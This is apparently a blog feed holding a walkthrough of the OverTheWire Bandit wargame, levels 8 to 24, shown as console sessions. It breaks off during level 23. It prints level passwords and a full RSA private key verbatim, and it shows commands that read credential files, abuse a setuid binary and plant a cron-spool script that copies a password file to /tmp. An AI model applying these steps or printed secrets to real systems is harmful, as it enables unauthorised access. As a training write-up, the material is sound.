&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit8@melinda:~$ cat data.txt &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; sort &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-9-10:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 9 -&amp;gt; 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit10.html&#34;&gt;Level 09&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This &lt;code&gt;data.txt&lt;/code&gt; file is in binary. So in order to find the strings we need
to dump it as hex, or, even simpler, run it through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit9@melinda:~$ strings data.txt  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;grep&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;
I========== the6
========== password
========== ism
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-10-11:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 10 -&amp;gt; 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit11.html&#34;&gt;Level 10&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Good ol base64. If you haven&amp;rsquo;t seen it before, you&amp;rsquo;ll get to see it a lot
more if you carry on doing these kind of challenges. Simply done though:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit10@melinda:~$ cat data.txt  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-11-12:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 11 -&amp;gt; 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit12.html&#34;&gt;level 11&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The description is a basically a verbose way of saying that the string
has been encoded with rot13. The quickest way for me to un-rotate it, is
using python:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit11@melinda:~$ cat data.txt 
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh
bandit11@melinda:~$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;import codecs;print codecs.decode(&amp;quot;5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh&amp;quot;, &amp;quot;rot13&amp;quot;)&amp;#39;&lt;/span&gt;
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-12-13:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 12 -&amp;gt; 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit13.html&#34;&gt;Level 12&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;From here on it&amp;rsquo;s going to get a little trickier. We know that data.txt is a hexdump
of a binary, so first let&amp;rsquo;s convert it back to a binary first with &lt;code&gt;xxd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ cat data.txt &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; xxd -r &amp;gt; data2
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Then we can find out the filetype of data2&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ file data2
data2: gzip compressed data, was &amp;quot;data2.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gzip&lt;/code&gt; it is. So uncompress that to data3&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ cat data2 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data3
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;and get its filetype next. I won&amp;rsquo;t go over each step in detail as there&amp;rsquo;s quite
a few iterations. I&amp;rsquo;ll post the console log of how I got to the flag and hopefully
that should be clear enough.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit12@melinda:/tmp/unl$ file data3
data3: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data3 &amp;gt; data4
bandit12@melinda:/tmp/unl$ file data4
data4: gzip compressed data, was &amp;quot;data4.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data4 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data5
bandit12@melinda:/tmp/unl$ file data5
data5: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin
bandit12@melinda:/tmp/unl$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data5.bin
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin
bandit12@melinda:/tmp/unl$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/unl$ bzcat data6.bin &amp;gt; data7
bandit12@melinda:/tmp/unl$ file data7
data7: POSIX tar archive (GNU)
bandit12@melinda:/tmp/unl$ tar xf data7
bandit12@melinda:/tmp/unl$ ls
data.txt  data2  data2.bin  data3  data4  data5  data5.bin  data6.bin  data7  data8.bin
bandit12@melinda:/tmp/unl$ file data8.bin
data8.bin: gzip compressed data, was &amp;quot;data9.bin&amp;quot;, from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/unl$ cat data8.bin &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; zcat &amp;gt; data9
bandit12@melinda:/tmp/unl$ file data9
data9: ASCII text
bandit12@melinda:/tmp/unl$ cat data9 
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Basically we identify, extract, repeat, until we&amp;rsquo;re at the plain text file with the
password.&lt;/p&gt;

&lt;h1 id=&#34;level-13-14:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 13 -&amp;gt; 14&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit14.html&#34;&gt;Level 13&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We&amp;rsquo;re given a lot of information here, and one of those is that we get the SSH
key for the &lt;code&gt;bandit14&lt;/code&gt; user. We can use this to login as that user without knowing
the password:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit13@melinda:~$ ssh -i ./sshkey.private bandit14@localhost 
Could not create directory &amp;#39;/home/bandit13/.ssh&amp;#39;.
The authenticity of host &amp;#39;localhost (127.0.0.1)&amp;#39; can&amp;#39;t be established.
ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
Are you sure you want to continue connecting (yes/no)? yes
.
.
bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We pass the key as an argument to the ssh command, and connect to the localhost
as bandit14. Then we can read the file with the password.&lt;/p&gt;

&lt;h1 id=&#34;level-14-15:c0b338e2f736b59776da7641378921cf&#34;&gt;Level 14 -&amp;gt; 15&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit15.html&#34;&gt;Level 14&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This level starts introducing some networking and how to interact with remote
hosts. Well, in this case it&amp;rsquo;s localhost, but the principle is the same.
We need to connect to a specific port on localhost and then supply
the current password. I&amp;rsquo;m using &lt;code&gt;netcat&lt;/code&gt; to do this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit14@melinda:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;All you get is a blank line when you&amp;rsquo;ve connected. The simply paste in the
password you logged in with and hit enter.&lt;/p&gt;

&lt;p&gt;Continues with &lt;a href=&#34;http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2&#34;&gt;Let&amp;rsquo;s crack Bandit Part 2&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Let&#39;s crack Bandit Part 2</title>
      <link>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/</link>
      <pubDate>Fri, 13 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part2/</guid>
      <description>

&lt;p&gt;Continues on from &lt;a href=&#34;http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1&#34;&gt;Let&amp;rsquo;s crack Bandit Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-15-16:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 15 -&amp;gt; 16&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit16.html&#34;&gt;Level 15&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Eventhough this is very similar to the previous level, it&amp;rsquo;s a little
more complicated as we need to connect with SSL.
The simplest way is using &lt;code&gt;openssl&lt;/code&gt; with &lt;code&gt;s_client&lt;/code&gt;. Once connected it&amp;rsquo;s the
same dance as above&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-16-17:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 16 -&amp;gt; 17&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit17.html&#34;&gt;Level 16&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let&amp;rsquo;s see how we&amp;rsquo;re going to handle this by seeing which ports are open&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ nmap localhost -p 31000-32000 

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Not too bad. Because it&amp;rsquo;s a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ nmap -sV -p 31046,31518,31691,31790,31960 localhost

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT      STATE SERVICE VERSION
31046/tcp open  echo
31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31691/tcp open  echo
31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31960/tcp open  echo
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now copy that key into a new file and use &lt;code&gt;chmod go-rw key&lt;/code&gt; to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit16@melinda:~$ ssh -i /tmp/k.key bandit17@localhost
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-17-18:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 17 -&amp;gt; 18&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit18.html&#34;&gt;Level 17&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We remain logged in as bandit17 from the previous level. To compare two files
we need to do a &lt;code&gt;diff&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit17@melinda:~$ diff passwords.old  passwords.new 
42c42
&amp;lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
---
&amp;gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The latter output is the entry in the &lt;code&gt;password.new&lt;/code&gt; file, and thus the password
for bandit18.&lt;/p&gt;

&lt;h1 id=&#34;level-18-19:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 18 -&amp;gt; 19&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit19.html&#34;&gt;Level 18&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh noes. We get logged out as soon as we log in because some nefarious
individual has been editing our &lt;code&gt;.bashrc&lt;/code&gt; file. Well in that case
we need to launch bash without an rc file.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ssh bandit18@bandit.labs.overthewire.org &amp;#39;/bin/bash --norc&amp;#39;
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Because we launched without an rc file there&amp;rsquo;s not going to be a prompt.
All we need to do is cat the &lt;code&gt;readme&lt;/code&gt; file and the password is ours.&lt;/p&gt;

&lt;h1 id=&#34;level-19-20:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 19 -&amp;gt; 20&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit20.html&#34;&gt;Level 19&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we learn about setuid binaries. Basically this is a binary that a user can
run, but when executed runs as the setuid user. To explain, long list the file&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit19@melinda:~$ ls -al
total 28
drwxr-xr-x   2 root     root     4096 Nov 14 10:32 .
drwxr-xr-x 167 root     root     4096 Jan 12 17:44 ..
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-rwsr-x---   1 bandit20 bandit19 7370 Nov 14 10:32 bandit20-do
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So you see it&amp;rsquo;s owned by &lt;code&gt;bandit20&lt;/code&gt; and the &lt;em&gt;s&lt;/em&gt; bit is set in &lt;code&gt;-rwsr-x---&lt;/code&gt;. That&amp;rsquo;s
how we identify setuid binaries.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s make use of it. This will run any command we supply, as the user &lt;code&gt;bandit20&lt;/code&gt;,
so let&amp;rsquo;s simply print the password&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;level-20-21:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 20 -&amp;gt; 21&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit21.html&#34;&gt;Level 20&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we&amp;rsquo;re entering a more complicated example of networking. Not only do we need
to connect to a host, we have to create the host to connect to. Once
&lt;code&gt;suconnect&lt;/code&gt; is connected, we must pass it the password and in return we get the
one for the next level.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s log into a new shell to create our server with &lt;code&gt;netcat&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit20@melinda:~$ nc -vlk 31337
Listening on [0.0.0.0] (family 0, port 31337)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The option &lt;code&gt;vlk&lt;/code&gt; is &lt;code&gt;verbose&lt;/code&gt;, &lt;code&gt;listen&lt;/code&gt;, and &lt;code&gt;keep-open&lt;/code&gt;. Ok, we&amp;rsquo;re listening
and now, from another terminal, we log into level 20 and execute &lt;code&gt;suconnect&lt;/code&gt;. From
our listening terminal, once we see an established connection, we send the password,
and get our new one back.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# terminal 2
bandit20@melinda:~$ ./suconnect  31337

# terminal 1
Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 43463)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-21-22:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 21 -&amp;gt; 22&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit22.html&#34;&gt;Level 21&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First let&amp;rsquo;s list the crontabs in the directory supplied. Our likely
candidate is &lt;code&gt;/etc/cron.d/cronjob_bandit22&lt;/code&gt; so let&amp;rsquo;s see what it runs
and also what that script contains&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;cat /etc/cron.d/cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;amp;&amp;gt; /dev/null
bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &amp;gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So basically it copies the password for the next level into a file in &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-22-23:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 22 -&amp;gt; 23&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit22.html&#34;&gt;Level 22&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pretty similar to above but with a different script&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;amp;&amp;gt; /dev/null
bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d &amp;#39; &amp;#39; -f 1)

echo &amp;quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&amp;quot;

cat /etc/bandit_pass/$myname &amp;gt; /tmp/$mytarget
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This script takes the string &lt;code&gt;I am user $myname&lt;/code&gt; and hashes it with an md5
then puts the next password into a file in &lt;code&gt;/tmp&lt;/code&gt; with that filename. The easiest
thing to do is to see what the filename will be. It will run as &lt;code&gt;bandit23&lt;/code&gt; so
&lt;code&gt;whoami&lt;/code&gt; will return that string.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit22@melinda:~$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo &lt;/span&gt;I am user bandit23 &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; md5sum &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; cut -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-23-24:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 23 -&amp;gt; 24&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit24.html&#34;&gt;Level 23&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once again&amp;hellip;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;amp;&amp;gt; /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo &amp;quot;Executing and deleting all scripts in /var/spool/$myname:&amp;quot;
for i in *;
do
    echo &amp;quot;Handling $i&amp;quot;
    ./$i
    rm -f $i
done
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So anything in &lt;code&gt;/var/spool/bandit24&lt;/code&gt; will get run as bandit24. Checking if we
can write to that directory show us&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:~$ ls -la /var/spool/
total 21
drwxr-xr-x  6 root     root     4096 Nov 15 14:55 .
drwxr-xr-x 15 root     root     4096 Nov 14 10:32 ..
drwxrwx---  2 bandit24 bandit23 1024 Mar 20 15:38 bandit24
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;that we can. Excellent. So let&amp;rsquo;s write a script to cat the password to a tmp file.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;!#/bin/bash
cat /etc/bandit_pass/bandit24 &amp;gt; /tmp/unl.pass
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

